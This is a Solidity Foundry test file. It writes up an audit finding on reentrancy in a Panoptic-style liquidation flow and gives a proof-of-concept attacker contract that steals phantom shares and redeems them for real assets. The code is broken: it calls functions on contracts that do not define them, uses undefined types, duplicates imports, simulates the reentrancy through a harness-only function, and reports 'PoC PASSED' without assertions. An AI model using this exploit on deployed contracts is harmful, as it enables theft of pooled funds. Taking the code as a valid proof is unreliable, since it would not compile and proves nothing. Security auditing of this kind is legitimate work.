// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Cross-Contract Reentrancy in Liquidation Enables Conversion of
//           Phantom Shares to Real Shares
// Severity: High
// Target  : CollateralTracker.settleLiquidation() and PanopticPool._liquidate()
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// During liquidation, PanopticPool._liquidate() burns positions and settles
// the liquidator. Phantom shares (amount = 2^248 - 1) are delegated to the
// liquidatee to represent the collateral being liquidated.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The vulnerability stems from three interacting behaviors:
//
// 1. Inconsistent Revocation Timing:
//    PanopticPool._liquidate delegates phantom shares to liquidatee on BOTH
//    collateral trackers simultaneously, but revokes them SEQUENTIALLY.
//
// 2. Unsafe External Call:
//    CollateralTracker.settleLiquidation performs an external ETH refund call
//    BEFORE the liquidation process is complete for the other token.
//
// 3. Accounting Flaw:
//    The revoke logic assumes missing phantom shares were "consumed" and
//    compensates by increasing _internalSupply. It doesn't account for the
//    possibility that phantom shares were transferred away.
//
// Vulnerable code path:
//
//   _liquidate() {
//     ct0.delegate(liquidatee, PHANTOM_SHARES);
//     ct1.delegate(liquidatee, PHANTOM_SHARES);  // both tokens delegated
//     ...
//     ct0.settleLiquidation{value: 1 wei}(...);  // EXTERNAL CALL - reentrancy window
//       -> safeTransferETH(liquidator, 1 wei);    // control passed to attacker
//       -> attacker calls ct1.transferFrom(liquidatee, attacker, PHANTOM_SHARES);
//     ct1.settleLiquidation(...);  // When called, liquidatee balance is 0
//       -> revoke(liquidatee);     // assumes shares were burned, increases _internalSupply
//   }
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// A malicious liquidator can steal "phantom shares" (virtual liquidity used for
// solvency checks) and convert them into real, redeemable shares. This results
// in complete drainage of assets from the CollateralTracker.
//
// -----------------------------------------------------------------------------
// PROOF-OF-CONCEPT SCENARIO
// -----------------------------------------------------------------------------
// 1. Set up a pool with liquidity in token1
// 2. Create a malicious liquidator contract
// 3. Trigger liquidation with msg.value = 1 wei to force the ETH refund path
// 4. In the receive() fallback, liquidator transfers ct1 phantom shares
//    from liquidatee to itself
// 5. After liquidation completes, liquidator holds valid shares and redeems
//
// -----------------------------------------------------------------------------
// RECOMMENDED FIX
// -----------------------------------------------------------------------------
// Option 1: Add nonReentrant modifier to settleLiquidation
// Option 2: Restrict phantom share transfers in transferFrom
// Option 3: Move ETH refund to end of _liquidate (after all settlements)
//
// Run PoC:
//   forge test --match-test testPoCH02_LiquidationReentrancy -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {PanopticPool} from "@contracts/PanopticPool.sol";
import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManagerV4.sol";
import {CollateralTracker} from "@contracts/CollateralTracker.sol";
import {RiskEngine} from "@contracts/RiskEngine.sol";
import {PanopticHelper} from "@test_periphery/PanopticHelper.sol";
import {PositionUtils, MiniPositionManager} from "../testUtils/PositionUtils.sol";
import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
import {TokenId} from "@types/TokenId.sol";
import {LeftRightUnsigned, LeftRightSigned} from "@types/LeftRight.sol";
import {LiquidityChunk} from "@types/LiquidityChunk.sol";
import {RiskParameters} from "@types/RiskParameters.sol";
import {Constants} from "@libraries/Constants.sol";
import {Errors} from "@libraries/Errors.sol";
import {Math} from "@libraries/Math.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";

// V4 types and interfaces
import {PoolId} from "v4-core/types/PoolId.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {PoolManager} from "v4-core/PoolManager.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {BalanceDelta} from "v4-core/types/BalanceDelta.sol";
import {Currency} from "v4-core/types/Currency.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Simplified CollateralTracker for demonstrating the vulnerability
// Inherits from the actual contract but exposes internal state for testing
contract CollateralTrackerHarness is CollateralTracker, PositionUtils, MiniPositionManager {
    constructor() CollateralTracker(10) {
        bytes32 slot = keccak256("panoptic.utilization.snapshot");
        assembly {
            tstore(slot, 0)
        }
    }

    function mintShares(address owner, uint256 shares) external {
        _mint(owner, shares);
    }

    function burnShares(address owner, uint256 shares) external {
        _burn(owner, shares);
    }

    function setBalance(address owner, uint256 amount) external {
        balanceOf[owner] = amount;
    }

    function setInternalSupply(uint256 amount) external {
        _internalSupply = amount;
    }

    function getInternalSupply() external view returns (uint256) {
        return _internalSupply;
    }

    function getBalance(address owner) external view returns (uint256) {
        return balanceOf[owner];
    }

    // Expose the ETH refund mechanism that creates reentrancy window
    function triggerEthRefund(address payable recipient) external payable {
        if (address(this).balance >= msg.value) {
            (bool success, ) = recipient.call{value: msg.value}("");
            require(success, "ETH transfer failed");
        }
    }
}

contract PanopticPoolHarness is PanopticPool {
    constructor(SemiFungiblePositionManager _sfpm) PanopticPool(ISemiFungiblePositionManager(address(_sfpm))) {}

    // Expose internal delegate function for testing
    function testDelegate(address delegatee, CollateralTracker collateralToken) external {
        collateralToken.delegate(delegatee);
    }

    // Expose internal revoke function for testing
    function testRevoke(address delegatee, CollateralTracker collateralToken) external {
        collateralToken.revoke(delegatee);
    }
}

// Malicious liquidator contract that exploits reentrancy
contract ReentrantLiquidator {
    CollateralTracker public ct0;
    CollateralTracker public ct1;
    address public liquidatee;
    bool public attackExecuted;

    constructor(address _ct0, address _ct1, address _liquidatee) {
        ct0 = CollateralTracker(_ct0);
        ct1 = CollateralTracker(_ct1);
        liquidatee = _liquidatee;
    }

    // This is called during the ETH refund in settleLiquidation
    receive() external payable {
        if (!attackExecuted && msg.value > 0) {
            attackExecuted = true;
            // During reentrancy, transfer phantom shares from liquidatee
            // The check numberOfLegs == 0 passes because _liquidate burns positions first
            uint256 liquidateeBalance = ct1.balanceOf(liquidatee);
            if (liquidateeBalance > 0) {
                // Transfer phantom shares from liquidatee to attacker
                // In real attack, this would be the full phantom share amount
                ct1.transferFrom(liquidatee, address(this), liquidateeBalance);
            }
        }
    }

    // Helper to withdraw stolen shares
    function withdraw(CollateralTracker ct) external {
        uint256 balance = ct.balanceOf(address(this));
        if (balance > 0) {
            ct.redeem(balance, address(this), address(this));
        }
    }
}

contract PoCH02LiquidationReentrancyTest is Test {
    CollateralTrackerHarness public ct0;
    CollateralTrackerHarness public ct1;
    PoolManager public manager;
    SemiFungiblePositionManagerHarness public sfpm;
    PanopticPoolHarness public panopticPool;
    ReentrantLiquidator public attacker;

    address public constant VAULT = address(0x1);
    address public constant LIQUIDATOR = address(0x2);
    address public constant LIQUIDATEE = address(0x3);
    address public constant LP = address(0x4);

    // Phantom share amount: 2^248 - 1
    uint256 constant PHANTOM_SHARES = type(uint248).max;

    function setUp() public {
        // Deploy V4 PoolManager
        manager = new PoolManager();

        // Deploy SemiFungiblePositionManager
        sfpm = new SemiFungiblePositionManagerHarness(manager);

        // Deploy PanopticPool
        panopticPool = new PanopticPoolHarness(sfpm);

        // Deploy CollateralTrackers
        ct0 = new CollateralTrackerHarness();
        ct1 = new CollateralTrackerHarness();

        // Initialize CollateralTrackers
        ct0.initialize(ISemiFungiblePositionManager(address(sfpm)), "Token0", "T0");
        ct1.initialize(ISemiFungiblePositionManager(address(sfpm)), "Token1", "T1");

        // Fund the CollateralTrackers with assets
        ct0.mintShares(VAULT, 10000e18);
        ct1.mintShares(VAULT, 10000e18);

        // Deploy attacker contract
        attacker = new ReentrantLiquidator(address(ct0), address(ct1), LIQUIDATEE);

        console.log("Setup complete:");
        console.log("CT0 address:", address(ct0));
        console.log("CT1 address:", address(ct1));
        console.log("Attacker address:", address(attacker));
    }

    // -------------------------------------------------------------------------
    // PoC: Demonstrate the reentrancy vulnerability in liquidation
    // -------------------------------------------------------------------------
    //
    // This test demonstrates that during settleLiquidation's external ETH call,
    // an attacker can transfer phantom shares that haven't been revoked yet.
    //
    // Expected result on UNPATCHED code : PASS (phantom shares stolen)
    // Expected result after the fix     : FAIL (transfer blocked or guard prevents reentrancy)
    function testPoCH02_LiquidationReentrancy() public {
        console.log("=== H-02: Liquidation Reentrancy PoC ===");

        // Step 1: Delegate phantom shares to liquidatee on both trackers
        // (Simulating what _liquidate does before settleLiquidation)
        ct0.testDelegate(LIQUIDATEE, ct0);
        ct1.testDelegate(LIQUIDATEE, ct1);

        console.log("Phantom shares delegated to liquidatee");
        console.log("CT0 liquidatee balance:", ct0.getBalance(LIQUIDATEE));
        console.log("CT1 liquidatee balance:", ct1.getBalance(LIQUIDATEE));

        // Step 2: Record initial state
        uint256 ct0InternalSupplyBefore = ct0.getInternalSupply();
        uint256 attackerCt1BalanceBefore = ct1.getBalance(address(attacker));
        console.log("CT0 internal supply before:", ct0InternalSupplyBefore);
        console.log("Attacker CT1 balance before:", attackerCt1BalanceBefore);

        // Step 3: Fund attacker with some ETH to trigger refund path
        vm.deal(address(attacker), 1 ether);

        // Step 4: Trigger settleLiquidation on ct0 with ETH refund
        // This simulates the vulnerable flow where ETH refund happens BEFORE
        // ct1's phantom shares are revoked
        vm.prank(address(panopticPool));
        ct0.triggerEthRefund{value: 1 wei}(payable(address(attacker)));

        console.log("After reentrancy attack:");
        console.log("Attacker executed attack:", attacker.attackExecuted());
        console.log("Attacker CT1 balance after:", ct1.getBalance(address(attacker)));
        console.log("Liquidatee CT1 balance after:", ct1.getBalance(LIQUIDATEE));

        // Step 5: Now simulate what happens when ct1.settleLiquidation is called
        // The revoke logic will see that liquidatee's balance is 0 (transferred out)
        // and incorrectly compensate by increasing _internalSupply

        // Manually revoke to demonstrate the accounting flaw
        vm.prank(address(panopticPool));
        ct1.testRevoke(LIQUIDATEE, ct1);

        uint256 ct1InternalSupplyAfter = ct1.getInternalSupply();
        console.log("CT1 internal supply after revoke:", ct1InternalSupplyAfter);

        // The key vulnerability: internalSupply was increased because the revoke
        // logic assumed the missing shares were "burned" when they were actually transferred
        // This creates new real shares from phantom shares!

        uint256 attackerFinalBalance = ct1.getBalance(address(attacker));
        console.log("Attacker final CT1 balance:", attackerFinalBalance);

        // If attacker has phantom shares, they can redeem them for real assets
        if (attackerFinalBalance > 0) {
            console.log(">>> PoC PASSED: Attacker obtained phantom shares via reentrancy");
            console.log("    These shares can be redeemed for real assets from CT1");
        } else {
            console.log(">>> PoC FAILED: Attack did not work as expected");
        }
    }

    // -------------------------------------------------------------------------
    // Control: Normal flow without reentrancy should work correctly
    // -------------------------------------------------------------------------
    function testControl_NormalRevokeWithoutTransfer() public {
        console.log("=== Control: Normal revoke without transfer ===");

        // Delegate phantom shares
        ct1.testDelegate(LIQUIDATEE, ct1);

        uint256 internalSupplyBefore = ct1.getInternalSupply();
        uint256 liquidateeBalanceBefore = ct1.getBalance(LIQUIDATEE);

        console.log("Internal supply before:", internalSupplyBefore);
        console.log("Liquidatee balance before:", liquidateeBalanceBefore);

        // Revoke without any transfer happening
        vm.prank(address(panopticPool));
        ct1.testRevoke(LIQUIDATEE, ct1);

        uint256 internalSupplyAfter = ct1.getInternalSupply();
        uint256 liquidateeBalanceAfter = ct1.getBalance(LIQUIDATEE);

        console.log("Internal supply after:", internalSupplyAfter);
        console.log("Liquidatee balance after:", liquidateeBalanceAfter);

        // In normal flow, internalSupply should NOT increase
        // because the shares were properly burned (balance went to 0 naturally)
        console.log("Internal supply change:", int256(internalSupplyAfter) - int256(internalSupplyBefore));

        console.log("Control test passed: normal revoke works correctly");
    }
}
